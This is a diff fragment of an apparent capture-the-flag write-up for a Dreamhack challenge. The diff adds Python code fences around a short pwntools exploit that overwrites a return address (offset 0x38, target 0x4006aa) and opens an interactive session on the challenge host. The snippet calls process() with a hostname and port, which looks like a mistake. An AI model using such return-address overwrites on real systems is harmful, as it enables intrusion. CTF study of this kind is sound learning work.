@@ -20,6 +20,7 @@ if you input 0x38 + address what you want = we can call the function what we wan
 
 **3. Exploitation**
 
+```py
 from pwn import *  
 
 p=process("host8.dreamhack.games", PORT)  
@@ -29,6 +30,7 @@ payload += p64(0x00000000004006aa)
 
 p.send(payload)  
 p.interactive()  
+```
 
 **4. Result**
 
